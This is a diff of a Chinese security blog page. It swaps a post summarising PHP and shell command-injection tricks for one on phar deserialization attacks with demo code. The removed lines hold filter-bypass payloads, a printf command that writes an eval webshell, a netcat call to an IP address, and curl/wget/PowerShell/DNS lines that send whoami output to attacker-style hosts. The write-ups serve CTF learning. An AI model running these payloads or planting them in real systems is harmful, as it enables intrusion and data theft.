@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>命令注入总结 · wywwzjj&#39;s Blog</title>
+    <title>phar 与反序列化学习 · wywwzjj&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">wywwzjj&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">命令注入总结</a>
+                <a href="#" class="post-name">phar 与反序列化学习</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            命令注入总结
+            phar 与反序列化学习
             <!-- 404 -->
             
         </h1>
@@ -266,20 +266,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="命令注入">命令注入</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="总结">总结</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/05/12</span>
+                    <span class="post-intro-time">2019/05/18</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,167 +401,74 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h2><p>PHP 中有不少可以直接执行代码的函数。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>();</span><br><span class="line">assert();</span><br><span class="line">system();</span><br><span class="line">exec();</span><br><span class="line">shell_exec();</span><br><span class="line">passthru();</span><br><span class="line">escapeshellcmd();</span><br><span class="line">pcntl_exec();</span><br></pre></td></tr></table></figure>
-
-<p>preg_replace( ) 代码执行</p>
-<p>preg_replace() 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">"&lt;tag&gt;phpinfo()&lt;/tag&gt;"</span>;</span><br><span class="line">	preg_replace(<span class="string">"/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e"</span>, <span class="string">"addslashes(\\1)"</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>若无 <code>/e</code> 修饰符，则可以尝试 %00 截断。</p>
-<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul>
-<li><p>cmd &gt; file<br>  把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p>
-</li>
-<li><p>cmd &gt;&gt; file<br>  把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p>
-</li>
-<li><p>cmd &lt; file<br>  使cmd命令从file读入</p>
-</li>
-<li><p>cmd &lt;&lt; text<br>  从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p>
-</li>
-<li><p>cmd &lt;&lt;&lt; word<br>  把word（而不是文件word）和后面的换行作为输入提供给cmd。</p>
-</li>
-<li><p>cmd &lt;&gt; file<br>  以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p>
-</li>
-<li><p>cmd &gt;| file<br>  功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p>
-</li>
-<li><p>: &gt; filename</p>
-<p>  把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p>
-</li>
-<li><p>cmd &gt;&amp;n</p>
-<p>  把输出送到文件描述符n</p>
-</li>
-<li><p>cmd m&gt;&amp;n</p>
-<p>  把输出到文件符m的信息重定向到文件描述符n</p>
-</li>
-<li><p>cmd &gt;&amp;-</p>
-<p>  关闭标准输出</p>
-</li>
-<li><p>cmd &lt;&amp;n</p>
-<p>  输入来自文件描述符n</p>
-</li>
-<li><p>cmd m&lt;&amp;n</p>
-<p>  m来自文件描述各个n</p>
-</li>
-<li><p>cmd &lt;&amp;-</p>
-<p>  关闭标准输入</p>
-</li>
-<li><p>cmd &lt;&amp;n-</p>
-<p>  移动输入文件描述符n而非复制它。</p>
-</li>
-<li><p>cmd &gt;&amp;n-</p>
-<p>  移动输出文件描述符n而非复制它。<br>  注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p>
-</li>
-</ul>
-<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">flag</span> /&#123;cat,<span class="built_in">flag</span>&#125;</span><br><span class="line">more <span class="built_in">flag</span></span><br><span class="line">less <span class="built_in">flag</span></span><br><span class="line">bzmore <span class="built_in">flag</span></span><br><span class="line">bzless <span class="built_in">flag</span></span><br><span class="line">head <span class="built_in">flag</span></span><br><span class="line">tail <span class="built_in">flag</span></span><br><span class="line">tailf <span class="built_in">flag</span> </span><br><span class="line">tac <span class="built_in">flag</span></span><br><span class="line">nl <span class="built_in">flag</span></span><br><span class="line">od -a <span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fire</span> <span class="built_in">flag</span></span><br><span class="line">wc <span class="built_in">flag</span></span><br><span class="line">uniq <span class="built_in">flag</span></span><br><span class="line">diff <span class="built_in">flag</span> flag1.txt</span><br><span class="line">sed -n <span class="string">'1,2p'</span> <span class="built_in">flag</span></span><br><span class="line"><span class="built_in">find</span> -P <span class="built_in">flag</span></span><br><span class="line">strings <span class="built_in">flag</span></span><br><span class="line">curl file:<span class="comment">///root/flag</span></span><br><span class="line"><span class="built_in">sort</span> <span class="built_in">flag</span></span><br><span class="line">bash -v <span class="built_in">flag</span> </span><br><span class="line">rev <span class="built_in">flag</span></span><br><span class="line">paste ./<span class="built_in">flag</span>.txt /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0a、%0d    换行符与回车符</span></span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows</span></span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span></span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul>
-<li>win 下执行 bat</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br></pre></td></tr></table></figure>
-
-<p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dir</span>=../ %<span class="number">1</span>a whoami</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul>
-<li>${IFS}</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag  <span class="comment"># \0x09 是 TAB</span></span></span><br></pre></td></tr></table></figure>
-
+        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="与普通反序列化利用有什么区别？"><a href="#与普通反序列化利用有什么区别？" class="headerlink" title="与普通反序列化利用有什么区别？"></a>与普通反序列化利用有什么区别？</h3><p>在 PHP 下利用反序列化漏洞的时候，通常走这样的一条路线：</p>
+<p><strong>反序列化点 =&gt; 可利用函数 =&gt; 构造反序列化 POP 链</strong></p>
+<p>但在 2018 年的 Black Hat 上，安全研究员 Sam Thomas 指出了一条新思路：</p>
+<p>在<strong>文件系统函数</strong> （ file_get_contents 、 unlink 等）参数可控的情况下，配合 <strong>phar:// 伪协议</strong> ，可以不依赖反序列化函数 <code>unserialize()</code> 直接进行反序列化的操作。</p>
+<h3 id="phar-是什么？"><a href="#phar-是什么？" class="headerlink" title="phar 是什么？"></a>phar 是什么？</h3><p><a href="https://www.php.net/manual/en/phar.using.intro.php" target="_blank" rel="noopener">官方文档</a> 给出了详细的解释。概括来说，有如下<strong>特点</strong>：</p>
 <ul>
-<li>重定向符&lt;&gt;</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul>
-<li>拼接</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>利用已存在的资源</li>
-</ul>
-<p>从已有的文件或者环境变量中获得相应的字符。</p>
-<ul>
-<li>编码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">可以通过这样来写webshell,内容为&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>单引号、双引号</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c""at fl''ag</span><br><span class="line">c'a't f'l'ag</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>反斜线 \</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>通配符</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?in/?s =&gt; ls</span><br><span class="line"></span><br><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br><span class="line">[! ] 同 ^</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"></span><br><span class="line">echo d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line">echo &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line">echo fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br><span class="line"></span><br><span class="line">花括号拓展&#123;OS_COMMAND,ARGUMENT&#125;</span><br><span class="line">在Linux bash中还可以使用&#123;cat,/etc/passwd&#125;来绕过</span><br><span class="line">这里没实验成功</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>未定义变量</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">x /etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可变函数</li>
-</ul>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(whoami)</span><br><span class="line"><span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b].<span class="variable">$_GET</span>[c])</span><br><span class="line"></span><br><span class="line">获取内置函数<span class="built_in"> system </span>的索引后，直接执行</span><br><span class="line">get_defined_functions()[internal] | grep ststem</span><br><span class="line">get_defined_functions()[internal][381](whoami)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>$@</code></li>
-</ul>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">$ i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span>|<span class="variable">$0</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo &#123;nc,47.101.220.241,2333&#125;|<span class="variable">$0</span></span><br><span class="line">直接连 nc 了。。。<span class="variable">$0</span> 好牛逼？</span><br><span class="line"><span class="variable">$0</span> 就相当于 bash 另外 <span class="variable">$n</span> 表示命令行第 n 个参数</span><br><span class="line"></span><br><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>利用已经存在的资源</li>
-</ul>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">echo</span> $PATH</span><br><span class="line"><span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1-4</span><br><span class="line"><span class="string">/usr</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>${PS2} 对应字符 ‘&gt;’</li>
-<li>${PS4} 对应字符 ‘+’</li>
-<li>${IFS} 对应 内部字段分隔符</li>
-<li>${9} 对应 空字符串</li>
-</ul>
-<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul>
-<li><p>弹 shell</p>
+<li><p>Phar 存档在概念上类似于 Java JAR 存档，但是根据 PHP 应用程序的需求和灵活性进行了定制。</p>
 </li>
-<li><p>DNS 外带数据</p>
+<li><p>Phar 可以把多个文件归档到同一个文件中，不经过解压就能被 PHP 访问并执行。</p>
+</li>
+<li><p>Meta-data can be any PHP variable that can be serialized.</p>
 </li>
 </ul>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://testhash.test.dnslog.link/?`whoami`"</span></span><br></pre></td></tr></table></figure>
-
+<p>最后一点尤其重要，有序列化就有反序列。</p>
+<blockquote>
+<p>This meta-data is unserialized when a Phar archive is first accessed by any(!) file operation. </p>
+<p>This opens the door to unserialization attacks whenever a file operation occurs on a path whose<br>beginning is controlled by an attacker.</p>
+</blockquote>
+<p>再看一下 phar 的<strong>文件结构</strong>。</p>
+<blockquote>
+<p>The phar file format is literally laid out as stub / manifest / contents / signature, and stores the crucial information of what is included in the phar archive in its <em>manifest</em>.</p>
+</blockquote>
+<p>也就是说分为四个部分：</p>
 <ul>
-<li>HTTP 外带</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure>
+<li><p>stub</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul>
-<li>文件构造（参考橘子那个 hitcon）</li>
+<p>  可以当做一个标志来理解，正如上面写的这样，必须以 <code>_HALT_COMPILER();</code> 结尾。所以在设置 <code>stub</code> 时，也要有 <code>&lt;?php __HALT_COMPILER();</code> ，这里的设置就相当灵活了，你可以随便插数据 。比如：</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx;<span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">// ?&gt; 并不是必须的</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>manifest</p>
+<p>  phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的 meta-data，这是上述攻击手法最核心的地方。</p>
+<p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1g385zk9pc4j20np0a775m.jpg" alt></p>
+</li>
+<li><p>contents：被压缩文件的内容。</p>
+</li>
+<li><p>signature：签名，放在文件末尾。</p>
+</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">w</span></span><br><span class="line">将会创建一个名字为 w 的空文件。</span><br></pre></td></tr></table></figure>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>用个小 Demo 来测试一下反序列化（注意要将 php.ini 中的 phar.readonly 选项设置为 0，否则无法生成）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);  <span class="comment">// 后缀名必须为phar，生成后可随意修改</span></span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">"2333&lt;?php __HALT_COMPILER();"</span>);  <span class="comment">// 设置stub</span></span><br><span class="line">    $p-&gt;setMetadata(<span class="keyword">new</span> Test());  <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);  <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    <span class="comment">// 签名自动计算</span></span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>工具</p>
-<ul>
-<li><a href="https://github.com/ewilded/shelling" target="_blank" rel="noopener">shelling</a></li>
-</ul>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的 N 种姿势</a></p>
-<p><a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
+<p>可以看到 meta-data 在 phar 中的存在形式</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386hud6grj20hj070jsn.jpg" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dese_phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://test.phar/1'</span>;  <span class="comment">// 这里访问的文件存在与否都不重要</span></span><br><span class="line">    file_get_contents($filename);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到析构函数被成功调用</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386lyrg9aj20ki036mxg.jpg" alt></p>
+<p>seaii 师傅给出了函数列表</p>
+<p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p>
+<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>这里不得不提 orange 在 hitcon 2017 出的 <code>baby^h-master-php-2017</code>，本题可以通过 <a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">i 春秋平台复现</a>。</p>
